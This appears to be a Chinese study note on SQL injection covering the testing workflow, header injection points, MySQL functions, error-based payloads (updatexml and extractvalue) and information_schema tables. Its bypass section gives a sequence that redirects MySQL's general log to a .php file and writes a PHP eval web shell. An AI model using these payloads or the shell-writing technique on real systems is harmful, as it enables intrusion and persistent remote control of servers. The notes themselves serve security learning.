---
title: "SQL 注入补充"
date: 2025-03-12
tags:
  - Others
categories:
  - Others
---
[[SQL 注入基础]]

# SQL 注入补充

- 基础利用点：
	1. 数据库名、表名、列名、数据；
	2. 自带数据库，用户及权限；
	3. 敏感函数，默认端口及应用；
	4. 查询方式（增删改更新）；

- 影响注入的主要因素：
	1. 数据库类型，操作权限，操作方法；
	2. 参数类型（符号的干扰）；
	3. 参数数据格式（加密编码等），提交数据的方式；
	4. 有无数据处理或逻辑回显；

- 测试主要方式/过程：
	- 盲对所有参数进行测试；
	- 整合功能点脑补测试；
	- 白盒代码审计分析测试；

- 主要流程：
	1. 判断数据库类型；
	2. 判断参数类型及格式；
	3. 判断数据格式及提交方式；
	4. 判断数据回显及防护；
	5. 获取库、表、列、数据；
	6. 对数据进一步利用；

# 需要注意的点

- 利用不同的数据类型进行数据的传输（eg：xml、jison、加密编码等）；

- 请求头的不同参数（IP、UA、COOKIE、Referer等）；
	eg：不同请求头的应用**场景**
	- UA（User-Agent）：对 UA 设备指定显示方案；对 UA 设备进行信息记录；（如网页对手机和电脑页面所显示不同）；
	- XFF（X-Forwarded-For）：限制 IP 访问功能；记录 IP 访问日志；
	- Cookie：根据用户 ID （存储在 Cookie 中）来查询信息；
	- Referer：网站期望登录请求来自于本站页面，若其他来源则拒绝登录；

- 数据库用户不同，可操作的数据库和文件读写权限不同；

示例：`show variables like "secure%"`查看变量`secure_file_priv` 开关，用于限制文件的读取和写入；

- 绕过条件：需要存在可执行 SQL 的地方（后台 SQL 命令行，phpmyadmin 等）执行命令；（eg：获取网站后台/数据库账号密码 mysql 数据库下的 user 表中；）再修改原配置来写入文件后门；

```sql
slow_query_log=1（启用慢查询日志(默认禁用)）
show variables like 'general_log';
set global general_log=on;
set global general_log_file='D:/phpstudy_pro/WWW/php/55/bypass.php';
select '<?php @eval($_POST[x]);?>'
```

# 常用的基本函数

- `group_concat()`将多行合并成一行；
- `length()`计算字符串长度;
- `substr(string，start，length)`和`mid(a,b,c)`一样，字符串截取，注：mysql 中的 start 是从 1 开始的；
- `count()`统计数据表中包含的记录行的总数；
- `limit offset, row_count`：`offset`从结果集的第几行开始`row_count`返回的行数；
- `sleep()`使程序执行指定时间，单位为秒；
- `if(expr1,expr2,expr3)`：如果 1 成立，执行 2，否则执行 3 ；
- `concat(str1,str2,str3,...)`把字符串无缝拼接起来；
- `load_file(filename)`读取一个文件并将其内容作为字符串返回；
- `like 'ro%'`判断 ro 或 ro... 是否成立；
- `regexp '^aaaa[a-z]'`匹配 aaaa 及 aaaa... 等；
- `left(a,b)`从左侧截取 a 的前 b 位；
- `ord=ascii`：`ascii(x)=97`判断 x 的 ascii 码是否等于 97；

- `updatexml(XML_document,Xpath_string,new_value)`：xml 文档名称，xpath 格式的字符串（若不是，则报错），替换查找到符合条件的数据；`updatexml(1,concat(0x7e,(select database()),0x7e),1)`
- `extractvalue(xml_frag,xpath_expr)`：目标 xml 文档，xpath 路径法表示的查找路径；`extractvalue(1,concat(0x7e,(select database()),0x7e))`
- `floor()`、`rand()`、`group by`配合进行报错注入；

> - mysql5.1.5 开始提供两个用于 XML 查询和修改的函数，通过 XML 函数进行报错，来进行注入；
> - Xpath 定位必须是有效的，否则会发生错误，利用这一特性爆出想要的数据；
> - 注：必须在 xpath 那里传入特殊字符，mysql 才会报错，特殊字符可使用`~`的 16 进制`0x7e`来表示；xpath 只会报错 32 个字符；

> https://www.jianshu.com/p/bc35f8dd4f7c
> 
> https://www.cnblogs.com/impulse-/p/14227189.html

> 以上均是 MySQL 数据库为基础的 SQL 注入方式，不同数据库会有所不同（但大致原理基本相同）；PostGRESQL、MongoDB、DB2、Oracle、SQLite、Access 等。

案例：

https://mp.weixin.qq.com/s/Xf08xaV-YcZsQopE19pPEQ
https://mp.weixin.qq.com/s/CiCxpHbW4IArB2nYSH-12w
https://mp.weixin.qq.com/s/_jj0o7BKm8CGEcn77gvdOg
https://mp.weixin.qq.com/s/c3wji_LL_nuiskAKpg89pA
https://mp.weixin.qq.com/s/t0VH_9qmb1EuwPGiz3Bbcw

# 开发中常用的 SQL 语句

在开发过程中，对数据库的查询一般可能得 SQL 语句：

```sql
SELECT * FROM users WHERE id = input LIMIT 0,1	# 数字型
SELECT * FROM users WHERE username = 'input' LIMIT 0,1	# 字符型
SELECT * FROM users WHERE username = "input" LIMIT 0,1
SELECT * FROM users WHERE username = ('input') LIMIT 0,1
SELECT * FROM users WHERE username = ("input") LIMIT 0,1

SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1


UPDATE users SET password = '$passwd' WHERE username='$row1'


INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)

SELECT * FROM users ORDER BY $id

# 输入的参数可能会经过正则、转义函数或WAF来进行过滤，这样就需要进行绕过

```

# 常用 SQL 语句

```sql
SELECT column1, column2 FROM table_name WHERE condition;
```

# MySQL

MySQL 数据库中默认存在 information_schema 数据库，其中存储 MySQL 服务器中所有数据库和对象的元数据。

SQL 注入常用该数据库中的表的介绍：

- tables 表：存储数据库中所有表的信息
	- table_schema：所有数据库名；
	- table_name：所有表名；
	- table_type：表类型（base table 或 view）；
- columns 表：存储所有表的列信息
	- table_schema：所有数据库名；
	- table_name：所有表名；
	- column_name：所有列名；
	- data_type：列的数据类型；
	- ordinal_position：列的位置（顺序）；
- schemata 表：存储所有数据库（模式）的信息
	- schema_name：数据库名；
- views 表：存储所有视图的定义信息
	- table_schema：所有数据库名；
	- table_name：所有视图名；
	- view_definition：视图的 SQL 定义；
- user_privileges 表：存储用户的全局权限
	- grantee：用户名和主机；
	- privilege_type：权限类型（如 select、insert）；
- table_privileges 表：存储用户对表的权限
	- grantee：用户名和主机；
	- table_schema：所有数据库名；
	- table_name：表名；
	- privilege_type：权限类型；

# [[../../工具/SQLMap/SQLMap|SQLMap]]
